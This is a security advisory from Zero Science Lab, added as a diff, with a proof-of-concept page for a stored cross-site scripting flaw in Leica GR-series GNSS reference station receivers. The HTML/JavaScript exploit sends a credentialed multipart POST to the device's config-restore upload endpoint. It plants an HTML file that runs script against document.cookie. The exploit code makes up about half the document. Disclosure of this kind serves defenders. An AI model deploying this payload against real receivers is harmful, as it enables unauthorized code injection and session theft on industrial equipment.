@@ -1,0 +1,83 @@
+<--
+
+Leica Geosystems GR10/GR25/GR30/GR50 GNSS 4.30.063 JS/HTML Code Injection
+
+
+Vendor: Leica Geosystems AG
+Product web page: https://www.leica-geosystems.com
+Affected version: 4.30.063
+                  4.20.232
+                  4.11.606
+                  3.22.1818
+                  3.10.1633
+                  2.62.782
+                  1.00.395
+
+Summary: The Leica GR10 is the next generation GNSS reference station receiver
+that combines the latest state-of-the-art technologies with a streamlined
+'plug and play' workflow. Designed for a wide variety of GNSS reference station
+applications, the Leica GR10 offers new levels of simplicity, reliability and
+performance.
+
+Desc: The application suffers from a stored XSS vulnerability. The issue is
+triggered via unrestricted file upload while restoring a config file allowing
+the attacker to upload an html or javascript file that will be stored in
+/settings/poc.html. This can be exploited to execute arbitrary HTML or JS
+code in a user's browser session in context of an affected site.
+
+Tested on: BarracudaServer.com (WindowsCE)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5503
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5503.php
+
+Ref: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5502.php
+
+
+18.12.2018
+
+-->
+
+
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/192.168.1.17\/upload_config\/", true);
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryKW8wlraBygxiEQyo");
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
+        xhr.withCredentials = true;
+        var body = "------WebKitFormBoundaryKW8wlraBygxiEQyo\r\n" + 
+          "Content-Disposition: form-data; name=\"file\"; filename=\"xss.html\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\n" + 
+          "\x3chtml\x3e\r\n" + 
+          "\x3chead\x3e\r\n" + 
+          "\x3ctitle\x3eHTMLi\x3c/title\x3e\r\n" + 
+          "\x3c/head\x3e\r\n" + 
+          "\x3cbody\x3e\r\n" + 
+          "\x3cscript\x3econfirm(document.cookie)\x3c/script\x3e\r\n" + 
+          "\x3c/body\x3e\r\n" + 
+          "\x3c/html\x3e\n" + 
+          "\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundaryKW8wlraBygxiEQyo--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Init" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
